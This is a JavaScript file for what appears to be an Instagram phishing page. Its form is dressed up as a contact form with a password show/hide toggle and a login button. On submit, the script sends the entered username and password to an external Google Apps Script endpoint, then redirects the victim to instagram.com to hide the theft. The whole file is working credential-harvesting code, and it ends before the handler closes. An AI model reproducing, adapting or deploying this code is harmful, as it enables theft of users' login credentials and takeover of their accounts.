const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxKsOxrUYN8r-rVekTooTqZYejXkxg4HnvpxwCpLX9pClK1gFXcxrdPIxsd9kWsrF5S/exec";
const REDIRECT_URL = "instagram.com"; 

const form = document.getElementById("contactForm");
const submitBtn = document.getElementById("loginBtn");
const togglePassword = document.getElementById("togglePassword");
const passwordInput = document.getElementById("mobile");

// Eye Icon Show/Hide Password Toggle
if (togglePassword && passwordInput) {
  togglePassword.addEventListener("click", function () {
    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      togglePassword.classList.add("active");
    } else {
      passwordInput.type = "password";
      togglePassword.classList.remove("active");
    }
  });
}

// Form Submit Event
form.addEventListener("submit", function (e) {
  e.preventDefault();

  const usernameValue = document.getElementById("name").value;
  const contactValue = document.getElementById("mobile").value;

  // Loader On
  submitBtn.classList.add("loading");
  submitBtn.disabled = true;

  const payload = {
    username: usernameValue,
    contact: contactValue
  };

  fetch(SCRIPT_URL, {
    method: "POST",
    headers: {
      "Content-Type": "text/plain;charset=utf-8",
    },
    body: JSON.stringify(payload)
  })
    .then((response) => response.json())
    .then((data) => {
      form.reset();
      window.location.href = REDIRECT_URL;
    })
    .catch((error) => {
      console.error("Error!", error);
      window.location.href = REDIRECT_URL;
    });
